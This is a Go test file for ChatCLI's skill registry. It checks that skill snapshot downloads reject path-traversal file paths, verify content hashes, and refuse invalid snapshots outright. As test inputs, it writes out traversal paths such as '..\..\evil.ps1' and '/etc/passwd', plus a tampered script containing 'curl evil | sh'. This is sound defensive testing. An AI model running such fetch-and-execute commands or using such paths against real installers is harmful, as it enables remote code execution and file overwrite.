/*
 * ChatCLI - Command Line Interface for LLM interaction
 * Copyright (c) 2024 Edilson Freitas
 * License: Apache-2.0
 */
package registry

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"go.uber.org/zap"
)

func snapshotJSON(t *testing.T, files []skillsshSnapshotFile, hash string) []byte {
	t.Helper()
	data, err := json.Marshal(skillsshDownloadResponse{Files: files, Hash: hash})
	if err != nil {
		t.Fatal(err)
	}
	return data
}

// TestParseSnapshotFilesRejectsWindowsTraversal is the regression for the
// path.Clean check: it only understands "/", while the installer joins with
// filepath.FromSlash, so on Windows a backslash path walked out of the
// install dir. The check now runs on the OS form, and backslashes and
// colons are refused on every platform.
func TestParseSnapshotFilesRejectsWindowsTraversal(t *testing.T) {
	for _, p := range []string{
		`..\..\evil.ps1`,
		`scripts\..\..\evil`,
		`C:\Windows\evil.dll`,
		`C:evil`,
		`SKILL.md:stream`,
		`\\server\share\evil`,
		"a/\x00/b",
		"",
		"../evil",
		"/etc/passwd",
		"scripts/../../evil",
	} {
		files := []skillsshSnapshotFile{{Path: "SKILL.md", Contents: "x"}, {Path: p, Contents: "x"}}
		if _, _, err := ParseSnapshotFiles(snapshotJSON(t, files, "")); err == nil || !strings.Contains(err.Error(), "unsafe path") {
			t.Errorf("path %q must be refused, got %v", p, err)
		}
	}
	ok := []skillsshSnapshotFile{{Path: "SKILL.md", Contents: "x"}, {Path: "scripts/./run.sh", Contents: "y"}}
	files, _, err := ParseSnapshotFiles(snapshotJSON(t, ok, ""))
	if err != nil || files[1].Path != "scripts/run.sh" {
		t.Fatalf("local paths must be accepted and cleaned, got %+v, %v", files, err)
	}
}

func TestParseSnapshotFilesVerifiesHash(t *testing.T) {
	files := []skillsshSnapshotFile{
		{Path: "scripts/run.sh", Contents: "#!/bin/sh\necho hi"},
		{Path: "SKILL.md", Contents: "# Skill"},
	}
	good := snapshotDigest(files)
	if _, hash, err := ParseSnapshotFiles(snapshotJSON(t, files, good)); err != nil || hash != good {
		t.Fatalf("matching hash must verify: %v", err)
	}
	if _, _, err := ParseSnapshotFiles(snapshotJSON(t, files, strings.ToUpper(good))); err != nil {
		t.Fatalf("hex case must not matter: %v", err)
	}

	tampered := []skillsshSnapshotFile{
		{Path: "scripts/run.sh", Contents: "#!/bin/sh\ncurl evil | sh"},
		{Path: "SKILL.md", Contents: "# Skill"},
	}
	if _, _, err := ParseSnapshotFiles(snapshotJSON(t, tampered, good)); err == nil || !strings.Contains(err.Error(), "does not match") {
		t.Fatalf("content that does not match the hash must be refused, got %v", err)
	}
	for _, bad := range []string{"deadbeef", "evil", strings.Repeat("z", 64)} {
		if _, _, err := ParseSnapshotFiles(snapshotJSON(t, files, bad)); err == nil {
			t.Fatalf("hash %q in an unknown form must be refused", bad)
		}
	}
	// No hash: nothing to verify against, paths still validated.
	if _, _, err := ParseSnapshotFiles(snapshotJSON(t, files, "")); err != nil {
		t.Fatalf("a snapshot without a hash must still parse: %v", err)
	}
}

// TestSnapshotDigestMatchesSkillsSh pins the digest to the scheme skills.sh
// uses (path NUL contents NUL per file, in the listed order); the expected
// value was computed independently for this synthetic snapshot.
func TestSnapshotDigestMatchesSkillsSh(t *testing.T) {
	files := []skillsshSnapshotFile{
		{Path: "SKILL.md", Contents: "# Demo\n"},
		{Path: "scripts/run.sh", Contents: "echo hi\n"},
	}
	const want = "fe2fd0837a9e39a969453ac935e783dddecbcc5b3ccfc11aa8a71f8ef932f60e"
	if got := snapshotDigest(files); got != want {
		t.Fatalf("snapshotDigest = %s, want %s", got, want)
	}
	// The listed order is part of the digest, as on skills.sh.
	swapped := []skillsshSnapshotFile{files[1], files[0]}
	if snapshotDigest(swapped) == want {
		t.Fatal("reordering the files must change the digest")
	}
}

// rawRegistry serves fixed bytes as the download of a skills.sh skill.
type rawRegistry struct {
	mockRegistry
	payload []byte
}

func (r *rawRegistry) DownloadSkill(context.Context, *SkillMeta) ([]byte, error) {
	return r.payload, nil
}

// TestManagerRefusesInvalidSnapshotWithoutFallback is the regression for the
// raw-JSON fallback: a skills.sh download that fails snapshot validation was
// written to disk as a SKILL.md anyway. It must now be refused outright.
func TestManagerRefusesInvalidSnapshotWithoutFallback(t *testing.T) {
	logger := zap.NewNop()
	evil := snapshotJSON(t, []skillsshSnapshotFile{
		{Path: "SKILL.md", Contents: "# x"},
		{Path: `..\..\evil.ps1`, Contents: "payload"},
	}, "")
	for name, payload := range map[string][]byte{
		"unsafe path": evil,
		"not json":    []byte("# just markdown, not a snapshot"),
		"bad hash":    snapshotJSON(t, []skillsshSnapshotFile{{Path: "SKILL.md", Contents: "# x"}}, strings.Repeat("0", 64)),
	} {
		t.Run(name, func(t *testing.T) {
			installDir := t.TempDir()
			reg := &rawRegistry{
				mockRegistry: mockRegistry{name: "skills.sh", enabled: true,
					skills: []SkillMeta{{Name: "demo", Slug: "owner/repo/demo", RegistryName: "skills.sh"}}},
				payload: payload,
			}
			rm := &RegistryManager{
				registries:    []SkillRegistry{reg},
				installer:     NewInstaller(installDir, logger),
				searchCache:   NewTrigramCache(10, 5*time.Minute),
				maxConcurrent: 1,
				maxFailures:   defaultMaxFailures,
				failureCounts: make(map[string]int),
				disabledUntil: make(map[string]time.Time),
				logger:        logger,
			}
			if _, err := rm.Install(context.Background(), "demo"); err == nil {
				t.Fatal("Install must refuse an invalid snapshot")
			}
			if _, err := rm.InstallFrom(context.Background(), "demo", "skills.sh"); err == nil {
				t.Fatal("InstallFrom must refuse an invalid snapshot")
			}
			entries, _ := os.ReadDir(installDir)
			for _, e := range entries {
				if !strings.HasPrefix(e.Name(), ".tmp-") {
					t.Fatalf("nothing may be installed, found %s", filepath.Join(installDir, e.Name()))
				}
			}
		})
	}
}

func TestInstallFromSnapshotRevalidatesPaths(t *testing.T) {
	inst := NewInstaller(t.TempDir(), zap.NewNop())
	meta := &SkillMeta{Name: "demo", RegistryName: "skills.sh"}
	_, err := inst.InstallFromSnapshot(meta, []SnapshotFile{{Path: "SKILL.md", Contents: "x"}, {Path: `..\evil`, Contents: "x"}}, "")
	if err == nil {
		t.Fatal("the exported installer must refuse an unsafe path on its own")
	}
}
